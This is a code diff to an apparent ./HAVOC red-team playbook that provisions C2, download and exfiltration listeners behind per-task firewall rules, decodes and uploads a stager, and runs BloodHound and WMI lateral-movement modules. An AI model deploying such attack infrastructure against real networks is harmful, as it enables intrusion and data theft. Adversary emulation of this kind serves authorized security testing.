@@ -14,10 +14,6 @@ local "function" "stager_decode" {
     function_parameters = [resource.task.c2_task.stager.Output]
 }
 
-variable "public_cidr" {
-    description = "Public address range. Restrict access to ./HAVOC resources to this IP range."
-}
-
 variable "private_cidr" {
     description = "Private address range. Scanning modules will scan this IP range."
 }
@@ -75,22 +71,44 @@ resource "random_string" "random_32" {
 }
 
 resource "portgroup" "c2_portgroup" {
-    portgroup_name = "c2_portgroup_${local.function.date_stamp}"
-    ip_ranges      = variable.public_cidr
+    portgroup_name        = "c2_portgroup_${local.function.date_stamp}"
+    portgroup_description = "c2_portgroup_${local.function.date_stamp}"
+}
+
+resource "portgroup_rule" "c2_portgroup_initial_access_task" {
+    portgroup_name = resource.portgroup.c2_portgroup.portgroup_name
+    ip_ranges      = "${data.tasks.initial_access_task.public_ip}/32"
+    port           = "443"
+    ip_protocol    = "tcp"
+}
+
+resource "portgroup_rule" "c2_portgroup_lateral_movement_task" {
+    portgroup_name = resource.portgroup.c2_portgroup.portgroup_name
+    ip_ranges      = "${data.tasks.lateral_movement_task.public_ip}/32"
     port           = "443"
     ip_protocol    = "tcp"
 }
 
 resource "portgroup" "http_portgroup" {
-    portgroup_name = "http_portgroup_${local.function.date_stamp}"
-    ip_ranges      = variable.public_cidr
+    portgroup_name        = "http_portgroup_${local.function.date_stamp}"
+    portgroup_description = "http_portgroup_${local.function.date_stamp}"
+}
+
+resource "portgroup_rule" "http_portgroup_initial_access_task" {
+    portgroup_name = resource.portgroup.http_portgroup.portgroup_name
+    ip_ranges      = "${data.tasks.initial_access_task.public_ip}/32"
     port           = "443"
     ip_protocol    = "tcp"
 }
 
 resource "portgroup" "exfil_portgroup" {
-    portgroup_name = "exfil_portgroup_${local.function.date_stamp}"
-    ip_ranges      = variable.public_cidr
+    portgroup_name        = "exfil_portgroup_${local.function.date_stamp}"
+    portgroup_description = "exfil_portgroup_${local.function.date_stamp}"
+}
+
+resource "portgroup_rule" "exfil_portgroup_initial_access_task" {
+    portgroup_name = resource.portgroup.exfil_portgroup.portgroup_name
+    ip_ranges      = "${data.tasks.initial_access_task.public_ip}/32"
     port           = "443"
     ip_protocol    = "tcp"
 }
@@ -136,6 +154,7 @@ resource "listener" "c2_listener" {
     portgroups    = [resource.portgroup.c2_portgroup.portgroup_name]
     host_name     = "c2-${resource.random_string.random_6.result}"
     domain_name   = variable.domain_name
+    depends_on    = [resource.portgroup_rule.c2_portgroup_initial_access_task.portgroup_name,resource.portgroup_rule.c2_portgroup_lateral_movement_task.portgroup_name]
 }
 
 resource "task" "http_task" {
@@ -166,6 +185,7 @@ resource "listener" "http_listener" {
     portgroups    = [resource.portgroup.http_portgroup.portgroup_name]
     host_name     = "downloads-${resource.random_string.random_6.result}"
     domain_name   = variable.domain_name
+    depends_on    = resource.portgroup_rule.http_portgroup_initial_access_task.portgroup_name
 }
 
 resource "task" "exfil_task" {
@@ -196,6 +216,7 @@ resource "listener" "exfil_listener" {
     portgroups    = [resource.portgroup.exfil_portgroup.portgroup_name]
     host_name     = "uploads-${resource.random_string.random_6.result}"
     domain_name   = variable.domain_name
+    depends_on    = resource.portgroup_rule.exfil_portgroup_initial_access_task.portgroup_name
 }
 
 resource "file" "stager_upload" {
@@ -384,7 +405,7 @@ action "execute_agent_module" "invoke_wmi" {
     depends_on        = action.execute_agent_module.bloodhound
 
     module_args = {
-        ComputerName = data.tasks.lateral_movement_task.local_ip
+        ComputerName = data.tasks.lateral_movement_task.local_ip[0]
         Listener     = resource.task.c2_task.listener.listener_type
     }
 }
